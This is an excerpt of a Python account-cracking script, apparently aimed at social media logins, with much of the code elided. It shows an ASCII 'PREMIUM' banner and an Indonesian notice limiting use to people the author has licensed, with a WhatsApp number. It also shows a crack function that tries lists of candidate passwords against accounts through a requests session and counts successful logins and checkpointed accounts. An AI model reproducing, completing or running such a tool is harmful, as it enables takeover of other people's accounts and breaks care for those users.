...
def banner():
	...
	ban='''
_____    _____    ______   __  __   _____   _    _   __  __ 
 |  __ \  |  __ \  |  ____| |  \/  | |_   _| | |  | | |  \/  |
 | |__) | | |__) | | |__    | \  / |   | |   | |  | | | \  / |
 |  ___/  |  _  /  |  __|   | |\/| |   | |   | |  | | | |\/| |
 | |      | | \ \  | |____  | |  | |  _| |_  | |__| | | |  | |
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# SCRIPT INI HANYA BOLEH DI GUNAKAN OLEH ORANG YANG SUDAH MEMPEROLEH IZIN DARI AUTHOR : AMIRXCODE, KONTAK IZIN AKSES WA:085718094505'
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%sAmirTzyy %s🐍%s 🐍 OK:%s 🐍 CP:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='AMIR-ZYY LIVE'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]AMIR-ZY YLIVE[/bold green]'))
					ok+=1
					break
